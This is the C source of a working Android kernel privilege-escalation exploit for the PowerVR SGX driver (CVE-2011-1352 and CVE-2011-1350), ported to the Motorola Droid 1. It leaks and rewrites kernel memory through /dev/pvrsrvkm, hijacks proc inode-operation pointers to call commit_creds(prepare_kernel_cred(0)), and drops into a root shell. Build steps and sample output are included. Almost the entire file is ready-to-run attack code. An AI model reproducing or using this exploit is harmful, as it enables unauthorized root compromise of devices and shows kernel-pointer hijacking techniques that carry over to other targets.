/*
 * levidroid.c
 *
 * Ported to Motorola Droid 1 by Joshua J. Drake <levidroid@qoop.org>
 *
 * Android < 2.3.6 PowerVR SGX Privilege Escalation Exploit
 * Jon Larimer <jlarimer@gmail.com>
 * Jon Oberheide <jon@oberheide.org>
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1352
 *
 *   CVE-2011-1352 is a kernel memory corruption vulnerability that can lead 
 *   to privilege escalation. Any user with access to /dev/pvrsrvkm can use 
 *   this bug to obtain root privileges on an affected device.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1350
 *
 *   CVE-2011-1350 allows leaking a portion of kernel memory to user mode 
 *   processes. This vulnerability exists because of improper bounds checking
 *   when returning data to user mode from an ioctl system call.
 *
 * Usage:
 *
 *   $ CC="/path/to/arm-linux-androideabi-gcc"
 *   $ NDK="/path/to/ndk/arch-arm"
 *   $ CFLAGS="-I$NDK/usr/include/"
 *   $ LDFLAGS="-Wl,-rpath-link=$NDK/usr/lib -L$NDK/usr/lib -nostdlib $NDK/usr/lib/crtbegin_dynamic.o -lc"
 *   $ $CC -o levitator levitator.c $CFLAGS $LDFLAGS
 *   $ adb push levitator /data/local/tmp/
 *   $ adb shell
 *   $ cd /data/local/tmp
 *   $ ./levidroid
 *   [+] looking for symbols...
 *   [+] resolved symbol commit_creds to 0xc0078ef0
 *   [+] resolved symbol prepare_kernel_cred to 0xc0078d64
 *   [+] resolved symbol proc_dir_inode_operations to 0xc03cdee0
 *   [+] resolved symbol proc_dir_operations to 0xc03cde78
 *   [+] opening prvsrvkm device...
 *   [+] dumping kernel memory...
 *   [+] searching kmem for proc_dir_inode_operations pointers...
 *   [+] found proc_dir_entry for "DMA" @ 0xf7c0
 *   [+] poisoned 1 proc_dir_entry structs!
 *   [+] clobbering kmem with poisoned pointers...
 *   [+] triggering privesc via proc fs dir entries...
 *   [+] restoring original proc_dir_inode_operations pointers...
 *   [+] restored 1 proc_dir_inode_operations pointers!
 *   [+] privileges escalated, enjoy your shell!
 *   # id
 *   uid=0(root) gid=0(root)
 *
 *   Notes:
 *
 *     The vulnerability affects Android devices with the PowerVR SGX chipset
 *     which includes popular models like the Nexus S and Galaxy S series. The 
 *     vulnerability was patched in the Android 2.3.6 OTA update.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define CONNECT_SERVICES 0xc01c670c
#define DUMP_SIZE        161920

typedef struct {
	uint32_t ui32BridgeID;
	uint32_t ui32Size;
	void *pvParamIn;
	uint32_t ui32InBufferSize;
	void *pvParamOut;
	uint32_t ui32OutBufferSize;
	void * hKernelServices;
} PVRSRV_BRIDGE_PACKAGE;

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;


int fake_inode_getattr(void *mnt, void *dent, void *kstat)
{
	commit_creds(prepare_kernel_cred(0));
	return -EIO; // return sprintf(buf, "0wned\n");
}


typedef uint64_t u64;

struct inode_operations {
	int (*create) (void *,void *,int, void *);
	void * (*lookup) (void *,void *, void *);
	int (*link) (void *,void *,void *);
	int (*unlink) (void *,void *);
	int (*symlink) (void *,void *,const char *);
	int (*mkdir) (void *,void *,int);
	int (*rmdir) (void *,void *);
	int (*mknod) (void *,void *,int,dev_t);
	int (*rename) (void *, void *,
			void *, void *);
	int (*readlink) (void *, char __user *,int);
	void * (*follow_link) (void *, void *);
	void (*put_link) (void *, void *, void *);
	void (*truncate) (void *);
	int (*permission) (void *, int);
	int (*check_acl)(void *, int);
	int (*setattr) (void *, void *);
	int (*getattr) (void *mnt, void *, void *);
	int (*setxattr) (void *, const char *,const void *,size_t,int);
	ssize_t (*getxattr) (void *, const char *, void *, size_t);
	ssize_t (*listxattr) (void *, char *, size_t);
	int (*removexattr) (void *, const char *);
	void (*truncate_range)(void *, loff_t, loff_t);
	long (*fallocate)(void *inode, int mode, loff_t offset,
			  loff_t len);
	int (*fiemap)(void *, void *, u64 start,
		      u64 len);
};

struct inode_operations fake_inode_ops = {
	.getattr = fake_inode_getattr,
};

struct list_head {
	struct list_head *next, *prev;
};

struct proc_dir_entry {
	unsigned int low_ino;
	unsigned short namelen;
	const char *name;
	mode_t mode;
	nlink_t nlink;
	uid_t uid;
	gid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	/*
	 * NULL ->proc_fops means "PDE is going away RSN" or
	 * "PDE is just created". In either case, e.g. ->read_proc won't be
	 * called because it's too late or too early, respectively.
	 *
	 * If you're allocating ->proc_fops dynamically, save a pointer
	 * somewhere.
	 */
	const struct file_operations *proc_fops;
	struct proc_dir_entry *next, *parent, *subdir;
	void *data;
	void *read_proc;
	void *write_proc;
	int count;		/* use count */
	int pde_users;	/* number of callers into module in progress */
	void *pde_unload_lock; /* proc_fops checks and pde_users bumps */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
};


unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sname[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f) {
		return 0;
	}

	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			return addr;
		}
	}

	return 0;
}

int
do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size)
{
	PVRSRV_BRIDGE_PACKAGE pkg;

	memset(&pkg, 0, sizeof(pkg));

	pkg.ui32BridgeID = CONNECT_SERVICES;
	pkg.ui32Size = sizeof(pkg);
	pkg.ui32InBufferSize = in_size;
	pkg.pvParamIn = in;
	pkg.ui32OutBufferSize = out_size;
	pkg.pvParamOut = out;

	return ioctl(fd, 0, &pkg);
}

void stat_proc(char *base, int *pfound)
{
	DIR *dir;
	struct dirent *dentry;
	int ret;

	dir = opendir(base);
	if (!dir) {
		char err[PATH_MAX];

		sprintf(err, "[-] failed opening %s", base);
		perror(err);
		return;
	}

	while ((dentry = readdir(dir)) != NULL) {
		struct stat sb;
		char path[PATH_MAX];

		if (strcmp(dentry->d_name, ".") == 0 || strcmp(dentry->d_name, "..") == 0) {
			continue;
		}

		snprintf(path, sizeof(path), "%s/%s", base, dentry->d_name);

#ifdef DEBUG
		printf("[+] stat'n \"%s\"\n", path);
#endif
		if ((ret = lstat(path, &sb)) == -1) {
			if (errno == EIO) {
				(*pfound)++;
				break;
			}
			perror("stat");
		}

		if (S_ISDIR(sb.st_mode)) {
			stat_proc(path, pfound);
			if (*pfound > 0)
		    		break;
		}
	}

	closedir(dir);
}

int
main(int argc, char **argv)
{
	int fd, ret, found;
	char *dump, *dump_end;
	unsigned long iops, fops, *ptr;

	printf("[+] looking for symbols...\n");

	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] commit_creds symbol not found, aborting!\n");
		exit(1);
	}

	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] prepare_kernel_cred symbol not found, aborting!\n");
		exit(1);
	}

	iops = get_symbol("proc_dir_inode_operations");
	if (!iops) {
		printf("[-] proc_dir_inode_operations symbol not found, aborting!\n");
		exit(1);
	}
	fops = get_symbol("proc_dir_operations");
	if (!fops) {
		printf("[-] proc_dir_operations symbol not found, aborting!\n");
		exit(1);
	}

	printf("[+] opening prvsrvkm device...\n");

	fd = open("/dev/pvrsrvkm", O_RDWR);
	if (fd == -1) {
		printf("[-] failed opening pvrsrvkm device, aborting!\n");
		exit(1);
	}

	printf("[+] dumping kernel memory...\n");

	dump = malloc(DUMP_SIZE + 0x1000);
	dump_end = dump + DUMP_SIZE + 0x1000;
	memset(dump, 0, DUMP_SIZE + 0x1000);

	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		return 1; //exit(1);
	}

	printf("[+] searching kmem for proc_dir_inode_operations pointers...\n");

	found = 0;
	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
		if (*ptr == iops && ptr[1] == fops) {
			unsigned long base_off;
			struct proc_dir_entry pde, *ppde;
			
			base_off = (unsigned long)ptr - (unsigned long)dump;
			base_off -= (8 * 4);

			memcpy(&pde, dump + base_off, sizeof(pde));
			pde.name = dump + base_off + sizeof(pde);

			ppde = (struct proc_dir_entry *)(dump + base_off);

			printf("[+] found proc_dir_entry for \"%s\" @ 0x%x (0x%x)\n", pde.name, base_off,
				ppde->name - sizeof(pde));

			ppde->proc_iops = &fake_inode_ops;
			found++;
		}
	}

	printf("[+] poisoned %d proc_dir_entry structs!\n", found);

	if (found == 0) {
		printf("[-] could not find any proc_dir_entry structs, aborting!\n");
		exit(1);
	}

	printf("[+] clobbering kmem with poisoned pointers...\n");

	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	printf("[+] triggering privesc via proc fs dir entries...\n");

	found = 0;
	stat_proc("/proc", &found);
	if (found == 0) {
		printf("[-] failed to trigger privesc payload?!\n");
	}

	printf("[+] restoring original proc_dir_inode_operations pointers...\n");

	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	found = 0;
	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
		if (*ptr == (unsigned long) &fake_inode_ops) {
			*ptr = (unsigned long) iops;
			found++;
		}
	}

	printf("[+] restored %d proc_dir_inode_operations pointers!\n", found);

	if (found == 0) {
		printf("[-] could not restore any pointers, aborting!\n");
		exit(1);
	}

	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	if (getuid() != 0) {
		printf("[-] privileges not escalated, exploit failed!\n");
		exit(1);
	}

	printf("[+] privileges escalated, enjoy your shell!\n");

	execl("/system/bin/sh", "sh", NULL);

	return 0;
}
